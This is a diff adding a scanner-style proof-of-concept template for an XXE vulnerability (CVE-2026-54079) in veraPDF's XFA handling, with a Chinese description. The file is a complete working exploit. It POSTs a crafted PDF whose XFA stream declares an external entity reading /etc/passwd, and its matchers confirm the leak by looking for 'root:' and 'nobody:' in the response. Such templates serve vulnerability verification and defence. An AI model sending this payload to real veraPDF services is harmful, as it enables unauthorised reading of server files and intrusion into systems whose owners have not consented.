@@ -1,0 +1,76 @@
+[info]
+author = "AVE"
+description = "通过构造包含恶意XFA流的PDF文件，利用veraPDF验证库GFPDAcroForm.getdynamicRender()方法中未禁用XML外部实体的DocumentBuilderFactory配置，触发XXE漏洞读取服务器本地文件。向目标veraPDF验证服务提交特制PDF文件，检测响应中是否包含/etc/passwd文件内容。"
+id = "POC-AVE-2026-0780"
+name = "veraPDF Validation XXE via XFA PoC"
+severity = "high"
+tags = [
+    "cve-2026-54079",
+    "xxe",
+    "xfa",
+    "pdf",
+]
+vuln_id = [
+    "CVE-2026-54079",
+    "AVE-2026-0780",
+]
+
+[poc]
+logic = "any"
+
+[[poc.requests]]
+method = "POST"
+path = "/{{BaseURL}}/api/validate"
+protocol = "http"
+
+[poc.requests.body]
+content = """
+%PDF-1.7
+1 0 obj
+<< /Type /Catalog /Pages 2 0 R /AcroForm 3 0 R >>
+endobj
+2 0 obj
+<< /Type /Pages /Kids [] /Count 0 >>
+endobj
+3 0 obj
+<< /Fields [] /XFA 4 0 R >>
+endobj
+4 0 obj
+<< /Length 256 >>
+stream
+<?xml version="1.0"?>
+<!DOCTYPE xfa [
+  <!ENTITY xxe SYSTEM "file:///etc/passwd">
+]>
+<xdp:xdp xmlns:xdp="http://ns.adobe.com/xdp/">
+  <config><present><destruct>&xxe;</destruct></present></config>
+</xdp:xdp>
+endstream
+endobj
+xref
+0 5
+0000000000 65535 f 
+0000000009 00000 n 
+0000000058 00000 n 
+0000000115 00000 n 
+0000000158 00000 n 
+trailer
+<< /Size 5 /Root 1 0 R >>
+startxref
+430
+%%EOF"""
+type = "raw"
+
+[poc.requests.headers]
+Content-Type = "application/pdf"
+User-Agent = "AVE/1.0"
+
+[[poc.requests.matchers]]
+expect = true
+part = "body"
+type = "word"
+words = [
+    "root:",
+    "bin/bash",
+    "nobody:",
+]
